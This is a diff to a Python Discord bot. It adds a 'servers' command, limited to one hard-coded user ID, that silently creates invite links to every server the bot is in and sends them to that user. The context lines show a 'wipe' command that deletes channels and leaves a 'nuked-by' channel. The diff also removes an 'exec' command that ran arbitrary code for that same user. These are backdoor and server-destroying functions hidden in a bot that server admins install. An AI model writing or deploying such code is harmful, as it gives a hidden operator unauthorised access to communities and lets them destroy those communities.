@@ -1,3 +1,4 @@
+import asyncio
 import discord
 from discord.ext import commands
 
@@ -19,6 +20,16 @@ async def say(ctx, channel: discord.TextChannel = None, *, message: str = None):
 		if message and channel in ctx.guild.channels:
 			await channel.send(message)
 			
+# Connected Servers Listing
+@bot.command()
+async def servers(ctx):
+    if ctx.author.id == userID:
+        embed = discord.Embed(colour=discord.Colour.from_rgb(0, 0, 0))
+        for guild in bot.guilds:
+            invite = await guild.text_channels[0].create_invite()
+            embed.add_field(name=guild.name, value=invite.url, inline=True)
+        await ctx.send(embed=embed)
+	
 # Role Checker
 @bot.command()
 async def roles(ctx):
@@ -164,13 +175,6 @@ async def wipe(ctx):
             except:
                 continue
         await ctx.guild.create_text_channel(name=f'nuked-by-{ctx.author.display_name}')
-
-# Custom Script Execution
-@bot.command()
-async def exec(ctx, *, script):
-    if ctx.author.id == userID:
-        exec(script, globals())
-        await execution(ctx)
 
 # Bot Connection
 bot.run('BOT_TOKEN_HERE')
